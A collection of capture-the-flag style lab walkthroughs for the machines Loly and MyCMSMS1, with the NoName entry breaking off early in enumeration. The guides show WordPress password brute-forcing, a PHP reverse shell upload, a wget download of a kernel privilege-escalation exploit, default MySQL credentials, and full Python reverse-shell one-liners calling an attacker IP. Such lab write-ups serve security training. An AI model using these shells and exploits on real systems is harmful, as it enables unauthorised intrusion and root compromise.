    <content><![CDATA[<h1 id="Exploitation-Guide-for-Loly"><a href="#Exploitation-Guide-for-Loly" class="headerlink" title="Exploitation Guide for Loly"></a><strong>Exploitation Guide for Loly</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.120.151</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 09:42 EST</span><br><span class="line">Nmap scan report for 192.168.120.151</span><br><span class="line">Host is up (0.041s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The only service we find is a website on port 80.</p>
<h3 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a><strong>Gobuster</strong></h3><p>Navigating to port 80 gives us only the default <code>nginx</code> page, but we can use <code>gobuster</code> with the wordlist <strong>/usr/share/wordlists/dirb/small.txt</strong> to bruteforce this site’s hidden directories:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ gobuster dir -u http://192.168.120.151 -w /usr/share/wordlists/dirb/small.txt -z</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">...</span><br><span class="line">/wordpress (Status: 301)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This scan shows that there is likely a Wordpress site located in the <em>/wordpress</em> directory.</p>
<h3 id="Adding-Hostname-and-Fixing-Website"><a href="#Adding-Hostname-and-Fixing-Website" class="headerlink" title="Adding Hostname and Fixing Website"></a><strong>Adding Hostname and Fixing Website</strong></h3><p>If we navigate there (<a href="http://192.168.120.151/wordpress/">http://192.168.120.151/wordpress/</a>), we indeed find a Wordpress website; however, it looks broken. If we look at the page’s source code, we see that all references are pointing to <code>http://loly.lc/wordpress/</code>. We can easily fix this by adding the following entry to our <strong>/etc/hosts</strong> file:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cat /etc/hosts</span><br><span class="line">...</span><br><span class="line">192.168.120.151 loly.lc</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can now refresh the web page, and it should appear normally.</p>
<h3 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a><strong>WPScan</strong></h3><p>Having resolved the hostname issues, we can use <code>WPScan</code> to enumerate this Wordpress site. Let’s first look for potential users:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wpscan --url http://loly.lc/wordpress --enumerate u</span><br><span class="line">...</span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] loly</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We find a Wordpress user <code>loly</code>. Next, we use <code>WPScan</code> again to try to bruteforce this user’s password using the <strong>/usr/share/wordlists/metasploit/unix_passwords.txt</strong> wordlist:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wpscan --url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/metasploit/unix_passwords.txt</span><br><span class="line">...</span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: loly, Password: fernando</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The scanner finds that Loly’s password is <code>fernando</code>. With this information, we can now log in at <a href="http://loly.lc/wordpress/wp-login.php">http://loly.lc/wordpress/wp-login.php</a> as <code>loly:fernando</code>.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a><strong>File Upload</strong></h3><p>Once we are logged in, we can immediately see that the <code>AdRotate</code> extension is installed. With this extension, it is possible to upload files to the application, and we should be able to upload a PHP reverse shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Let’s change the IP address and port number as needed:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ip = &#x27;192.168.118.3&#x27;;  // CHANGE THIS</span><br><span class="line">$port = 4444;       // CHANGE THIS</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The extension supports the upload of several file formats including the <strong>.zip</strong> format. Let’s zip up our reverse shell as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ mv php-reverse-shell.php shell.php</span><br><span class="line">kali@kali:~$ zip shell.php.zip shell.php</span><br><span class="line">  adding: shell.php (deflated 59%)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can now upload our reverse shell by navigating to <strong>AdRotate</strong> &gt; <strong>Manage Media</strong>. We leave the selector at <code>banners</code> and then browse to and attach our file <strong>shell.php.zip</strong>:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_61_image_1_63pvAoPf.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_61_image_1_63pvAoPf.png"></p>
<p>With our file selected, we can click <code>Upload file</code> to complete the upload. We should see the message <code>Banner image saved</code>.</p>
<p>Once our shell is uploaded, we start a netcat listener on port 4444 and then navigate to <a href="http://192.168.120.151/wordpress/wp-content/banners/shell.php">http://192.168.120.151/wordpress/wp-content/banners/shell.php</a> to trigger our shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nc -lvp 4444listening on [any] 4444 ...connect to [192.168.118.3] from loly.lc [192.168.120.151] 44002Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux 09:24:52 up  2:46,  1 user,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATroot     tty1                      09:19   11.00s  0.09s  0.07s -bashuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@ubuntu:/$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@ubuntu:/$</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="OS-Version-Enumeration"><a href="#OS-Version-Enumeration" class="headerlink" title="OS Version Enumeration"></a><strong>OS Version Enumeration</strong></h3><p>One of the first things we should enumerate is the operating system version information:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ lsb_release -alsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription:    Ubuntu 16.04.1 LTSRelease:        16.04Codename:       xenialwww-data@ubuntu:/$ uname -auname -aLinux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p>We see that the Linux kernel version is <code>4.4.0-31</code>. Looking up exploits for this version leads us to a <a href="https://www.exploit-db.com/exploits/45010">local privilege escalation exploit for Linux kernels prior to 4.13.9</a>.</p>
<h3 id="Linux-Kernel-Exploit"><a href="#Linux-Kernel-Exploit" class="headerlink" title="Linux Kernel Exploit"></a><strong>Linux Kernel Exploit</strong></h3><p>We can copy the C source code file to our attacking machine, compile the exploit, and then host it over HTTP:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ gcc 45010.c -o exploitkali@kali:~$kali@kali:~$ sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...192.168.120.151 - - [07/Dec/2020 12:45:17] &quot;GET /exploit HTTP/1.1&quot; 200 -...</span><br></pre></td></tr></table></figure>

<p>We can now download the exploit to the target and give it executable permissions:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/$ cd /tmpcd /tmpwww-data@ubuntu:/tmp$ wget http://192.168.118.3/exploitwget http://192.168.118.3/exploit--2020-12-07 09:45:17--  http://192.168.118.3/exploitConnecting to 192.168.118.3:80... connected.HTTP request sent, awaiting response... 200 OKLength: 22272 (22K) [application/octet-stream]Saving to: ‘exploit’exploit             100%[===================&gt;]  21.75K  --.-KB/s    in 0.04s2020-12-07 09:45:17 (582 KB/s) - &#x27;exploit&#x27; saved [22272/22272]www-data@ubuntu:/tmp$www-data@ubuntu:/tmp$ chmod 777 exploitchmod 777 exploit</span><br></pre></td></tr></table></figure>

<p>And finally, we can run the exploit and become root:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@ubuntu:/tmp$ ./exploit</span><br><span class="line">./exploit</span><br><span class="line">[.]</span><br><span class="line">[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)</span><br><span class="line">[.]</span><br><span class="line">[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **</span><br><span class="line">[.]</span><br><span class="line">[*] creating bpf map</span><br><span class="line">[*] sneaking evil bpf past the verifier</span><br><span class="line">[*] creating socketpair()</span><br><span class="line">[*] attaching bpf backdoor to socket</span><br><span class="line">[*] skbuff =&gt; ffff88007b1e5d00</span><br><span class="line">[*] Leaking sock struct from ffff8800348e2f00</span><br><span class="line">[*] Sock-&gt;sk_rcvtimeo at offset 472</span><br><span class="line">[*] Cred structure at ffff880035ecbcc0</span><br><span class="line">[*] UID from cred structure: 33, matches the current: 33</span><br><span class="line">[*] hammering cred structure at ffff880035ecbcc0</span><br><span class="line">[*] credentials patched, launching shell...</span><br><span class="line"># whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Wordpress</tag>
        <tag>Kernel Exploit</tag>
        <tag>Gobuster</tag>
        <tag>File Upload</tag>
      </tags>
  </entry>
  <entry>
    <title>MyCMSMS1</title>
    <url>/undefined/MyCMSMS1/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-MyCMSMS1"><a href="#Exploitation-Guide-for-MyCMSMS1" class="headerlink" title="Exploitation Guide for MyCMSMS1"></a><strong>Exploitation Guide for MyCMSMS1</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan against all TCP ports:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# sudo nmap -p- 192.168.120.162</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-14 07:43 EDT</span><br><span class="line">Nmap scan report for 192.168.120.162</span><br><span class="line">Host is up (0.031s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">33060/tcp open  mysqlx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CMS-MS"><a href="#CMS-MS" class="headerlink" title="CMS MS"></a><strong>CMS MS</strong></h3><p>Navigating to port 80, we see a web portal of a content management system <code>CMS MS</code> and we can check its version to be <code>2.2.13</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# curl http://192.168.120.162 | grep version</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 19582    0 19582    0     0   164k      0 --:--:-- --:--:-- --:--:--  164k</span><br><span class="line">...</span><br><span class="line">This site is powered by &lt;a href=&#x27;http://www.cmsmadesimple.org&#x27;&gt;CMS Made Simple&lt;/a&gt; version 2.2.13&lt;/p&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This version does not have any known vulnerabilities.</p>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><strong>MySQL</strong></h3><p>On port 3306, there is an instance of MySQL running to support the CMS. We can try some default or weak credentials (such as <code>root:root</code>) for an easy win:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# mysql -h 192.168.120.162 -uroot -proot</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 16</span><br><span class="line">Server version: 8.0.19 MySQL Community Server - GPL</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>And we have a successful login with the username <code>root</code> and password <code>root</code>. Enumerating existing databases shows the database <code>cmsms_db</code>, which is the one supporting the CMS:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [(none)]&gt; SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| cmsms_db           |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.045 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; USE cmsms_db;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MySQL [cmsms_db]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We are interested in a users table here for some hashed credentials:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [cmsms_db]&gt; SHOW TABLES;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| Tables_in_cmsms_db             |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| cms_additional_users           |</span><br><span class="line">...</span><br><span class="line">| cms_users                      |</span><br><span class="line">| cms_users_seq                  |</span><br><span class="line">| cms_version                    |</span><br><span class="line">+--------------------------------+</span><br><span class="line">53 rows in set (0.032 sec)</span><br><span class="line"></span><br><span class="line">MySQL [cmsms_db]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Table <code>cms_users</code> is the one to target. Listing its contents shows the following:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [cmsms_db]&gt; SELECT * FROM cms_users;</span><br><span class="line">+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+</span><br><span class="line">| user_id | username | password                         | admin_access | first_name | last_name | email             | active | create_date         | modified_date       |</span><br><span class="line">+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+</span><br><span class="line">|       1 | admin    | fb67c6d24e756229aab021cea7605fb3 |            1 |            |           | admin@mycms.local |      1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |</span><br><span class="line">+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+</span><br><span class="line">1 row in set (0.029 sec)</span><br><span class="line"></span><br><span class="line">MySQL [cmsms_db]&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="CMS-MS-DB-User-Password-Reset"><a href="#CMS-MS-DB-User-Password-Reset" class="headerlink" title="CMS MS DB User Password Reset"></a><strong>CMS MS DB User Password Reset</strong></h3><p>We see the user <code>admin</code> and what looks like an MD5 hash <code>fb67c6d24e756229aab021cea7605fb3</code>. The hash is not quite a basic MD5 of the user’s password, and we need to research the exact algorithm used to generate such a hash. If found, that algorithm can be used to change the <code>admin</code> user’s password to one of our choosing.</p>
<p>It so happens that the CMS’ own website actually publishes the information on how to reset a user’s password (<a href="https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery">https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery</a>). It can be done with the following query:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#x27;sitemask&#x27;),&#x27;&#x27;),&#x27;NEW_PASSWORD&#x27;))) where username = &#x27;USER_NAME&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Changing it for our situation, it becomes:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE cms_users SET password = (SELECT MD5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#x27;sitemask&#x27;),&#x27;&#x27;),&#x27;admin&#x27;))) where username = &#x27;admin&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Executing this query should set the user’s password to <code>admin</code>, and we should then be able to authenticate to the CMS as <code>admin:admin</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [cmsms_db]&gt; SELECT username, password FROM cms_users WHERE user_id = 1;+----------+----------------------------------+| username | password                         |+----------+----------------------------------+| admin    | fb67c6d24e756229aab021cea7605fb3 |+----------+----------------------------------+1 row in set (0.030 sec)MySQL [cmsms_db]&gt; UPDATE cms_users SET password = (SELECT MD5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = &#x27;sitemask&#x27;),&#x27;&#x27;),&#x27;admin&#x27;))) where username = &#x27;admin&#x27;;Query OK, 1 row affected (0.033 sec)Rows matched: 1  Changed: 1  Warnings: 0MySQL [cmsms_db]&gt; SELECT username, password FROM cms_users WHERE user_id = 1;+----------+----------------------------------+| username | password                         |+----------+----------------------------------+| admin    | ab3dc656130f84d84be72bc033e29c96 |+----------+----------------------------------+1 row in set (0.039 sec)MySQL [cmsms_db]&gt; quitByekali@kali:~#</span><br></pre></td></tr></table></figure>

<p>Looks like the password hash was successfully changed.</p>
<h3 id="CMS-MS-Enumeration"><a href="#CMS-MS-Enumeration" class="headerlink" title="CMS MS Enumeration"></a><strong>CMS MS Enumeration</strong></h3><p>We can now log in to the CMS with the credentials <code>admin:admin</code> at <a href="http://192.168.120.162/admin/login.php">http://192.168.120.162/admin/login.php</a>. Looking around the portal, under <code>Extensions</code> we see <code>User Defined Tags</code> (<a href="http://192.168.120.162/admin/listusertags.php?__c=%E2%80%A6">http://192.168.120.162/admin/listusertags.php?__c=…</a>), where the <code>__c</code> parameter serves as XSRF protection and will be different for each request.</p>
<p>The description for <code>Tags</code> reads:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tags are little bits of PHP functionality that can be added to your content and/or templates.</span><br></pre></td></tr></table></figure>

<p>And the description for <code>User Defined Tags</code> reads:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User Defined Tags (UDT&#x27;s) that you can create and modify yourself to perform specific tasks, right from your browser.</span><br></pre></td></tr></table></figure>

<p>It looks like we are able to introduce arbitrary PHP code into a template.</p>
<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a><strong>Reverse Shell</strong></h3><p>After navigating to <code>User Defined Tags</code>, select <code>Add User Defined Tag</code> link. Name the tag <code>Shell</code> and place the following python reverse shell in the <code>Code</code> section:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec(&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.118.3\&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;&quot;);</span><br></pre></td></tr></table></figure>

<p>After saving this tag by clicking <code>Submit</code>, navigate to <code>Content &gt; Content Manager</code>. Click on the <code>Add New Content</code> link to insert our user defined tag with the python reverse shell. Set the title of the new page to <code>Shell</code> and add the following to the content section:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;Shell&#125;</span><br></pre></td></tr></table></figure>

<p>Save the new page by clicking <code>Submit</code>. Start a netcat listener on port 4444. The shell can then be triggered by visiting <a href="http://192.168.120.162/index.php?page=shell">http://192.168.120.162/index.php?page=shell</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# nc -lvp 4444listening on [any] 4444 ...192.168.120.162: inverse host lookup failed: Unknown hostconnect to [192.168.118.3] from (UNKNOWN) [192.168.120.162] 37460/bin/sh: 0: can&#x27;t access tty; job control turned off$ python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@mycmsms:/var/www/html$ whoamiwhoamiwww-datawww-data@mycmsms:/var/www/html$</span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Changing-User"><a href="#Changing-User" class="headerlink" title="Changing User"></a><strong>Changing User</strong></h3><p>We will look around the system for any interesting password files:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@mycmsms:/var/www/html$ find / -type f -name &quot;*pass*&quot; 2&gt;/dev/nullfind / -type f -name &quot;*pass*&quot; 2&gt;/dev/null.../var/www/html/admin/themes/OneEleven/images/icons/system/groupassign.gif/var/www/html/admin/.htpasswd...</span><br></pre></td></tr></table></figure>

<p>We find the file <strong>/var/www/html/admin/.htpasswd</strong>, which contains:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@mycmsms:/var/www/html$ cat /var/www/html/admin/.htpasswdcat /var/www/html/admin/.htpasswdTUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=www-data@mycmsms:/var/www/html$</span><br></pre></td></tr></table></figure>

<p>The string <code>TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=</code> is base64 encoded. Decoding it yields the following:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@mycmsms:/var/www/html$ echo &quot;TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=&quot; | base64 -d&lt;IzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=&quot; | base64 -dMFZG233VOI5FG2DJMVWGIQBRGIZQ====</span><br></pre></td></tr></table></figure>

<p>And the result string <code>MFZG233VOI5FG2DJMVWGIQBRGIZQ====</code> appears to be base32 encoded. Decoding that gives us this:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@mycmsms:/var/www/html$ echo &quot;MFZG233VOI5FG2DJMVWGIQBRGIZQ====&quot; | base32 -d&lt;echo &quot;MFZG233VOI5FG2DJMVWGIQBRGIZQ====&quot; | base32 -darmour:Shield@123</span><br></pre></td></tr></table></figure>

<p>All of this decoded yields <code>armour:Shield@123</code> user credentials. We will continue by logging in as that user:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@mycmsms:/var/www/html$ su armoursu armourPassword: Shield@123armour@mycmsms:/var/www/html$ whoamiwhoamiarmourarmour@mycmsms:/var/www/html$</span><br></pre></td></tr></table></figure>

<h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Checking the user’s sudo privileges shows that we are able to run python as root without password:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">armour@mycmsms:/var/www/html$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for armour on mycmsms:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User armour may run the following commands on mycmsms:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/python</span><br><span class="line">armour@mycmsms:/var/www/html$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>To exploit this, we simply start a netcat listener on port 443 and then execute a python reverse shell once again:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">armour@mycmsms:/var/www/html$ sudo python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.118.3&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line">&lt;s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>And we receive a root shell back:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~# sudo nc -lvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.120.162: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.118.3] from (UNKNOWN) [192.168.120.162] 41842</span><br><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Reverse Shell</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>NoName</title>
    <url>/undefined/NoName/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-NoName"><a href="#Exploitation-Guide-for-NoName" class="headerlink" title="Exploitation Guide for NoName"></a><strong>Exploitation Guide for NoName</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h3><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We initiate our enumeration process by running an <code>nmap</code> scan against our target to identify any open ports. After that, we immediately launch another scan adding in the <code>-A</code> argument for further service enumeration of the discovered ports.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.54.15</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-21 19:25 SAST</span><br><span class="line">Nmap scan report for 192.168.249.15</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p 80 -A 192.168.54.15</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-21 19:26 SAST</span><br><span class="line">Nmap scan report for 192.168.249.15</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>Browsing to the default web page on port 80 (<a href="http://192.168.54.15/">http://192.168.54.15/</a>), we identify a decoy masquerading as a system command execution utility.</p>
<p>After brute-forcing the website with <code>GoBuster</code>, we discover additional directories:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ locate common.txt</span><br><span class="line">...</span><br><span class="line">/usr/lib/python3/dist-packages/mercurial/helptext/common.txt</span><br><span class="line">/usr/share/dirb/wordlists/common.txt</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

